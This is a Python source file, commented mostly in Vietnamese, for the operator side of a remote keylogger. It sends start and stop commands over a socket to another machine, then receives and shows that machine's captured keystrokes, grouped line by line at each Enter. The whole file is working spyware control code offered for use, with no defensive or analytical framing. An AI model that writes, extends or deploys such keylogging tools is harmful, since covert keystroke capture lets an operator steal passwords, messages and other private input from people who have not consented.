# key_logger.py
from pynput import keyboard

# Biến trạng thái keylogger
keylogger_running = False

def key_logger(client_socket):
    print("Connected to the server. Listening for keystrokes... (Press 'Esc' to stop)")
    keys_pressed = ""
    MAX_LINE_LENGTH = 50
    
    def on_press(key):
        # Stop the keylogger locally and notify the server when 'Esc' is pressed
        if key == keyboard.Key.esc:
            client_socket.sendall("STOP_KEY_LOGGER".encode())                                    
            return False
        else:            
            print(f'Key {key} pressed')  # Hiển thị phím nhấn cho debugging
            

    with keyboard.Listener(on_press=on_press) as listener:
        try:
            while True:
                # Nhận dữ liệu từ server
                data = client_socket.recv(1024)
                decoded_data = data.decode("utf-8")

                # Kiểm tra và không in thông báo nếu là lệnh KEYLOGGER_STOPPED
                if decoded_data == "KEYLOGGER_STOPPED":
                    print("\n Keylogger stopped by server. Returning to main menu...\n")                    
                    break

                if not data:
                    print("No more data received. Exiting...\n")
                    break
                
                # Kiểm tra nếu nhận ký tự Enter từ server
                if decoded_data == ' Key.enter ':
                    # Khi nhận phím Enter, in ra các phím đã nhấn và reset
                    print(f'\rKeys pressed: {keys_pressed}')  # In ra các phím đã nhấn
                    keys_pressed = ""  # Reset sau khi nhấn Enter
                    print("Keys pressed: ", end='')  # Đưa con trỏ về đầu dòng để tiếp tục nhập
                else:
                    keys_pressed += decoded_data  # Thêm ký tự vào chuỗi
                    
                    # Nếu dòng quá dài, xuống dòng mà không lặp lại ký tự
                    if len(keys_pressed) > MAX_LINE_LENGTH:
                        print(f'\rKeys pressed: {keys_pressed[:MAX_LINE_LENGTH]}')  # In phần đầu của dòng
                        keys_pressed = keys_pressed[MAX_LINE_LENGTH:]  # Lưu phần còn lại để in tiếp
                    print(f'\rKeys pressed: {keys_pressed}', end='')  # In ra trên cùng một dòng
                
        except Exception as e:
            print(f"Error receiving data: {e}")

    listener.join()  # Wait for the listener to finish

def toggle_key_logger(client_socket):
    global keylogger_running
    if not keylogger_running:
        client_socket.sendall("START_KEY_LOGGER".encode())
        print("Starting keylogger...")
        keylogger_running = True
        key_logger(client_socket)
    else:
        client_socket.sendall("STOP_KEY_LOGGER".encode())
        print("Stopping keylogger...")
        keylogger_running = False

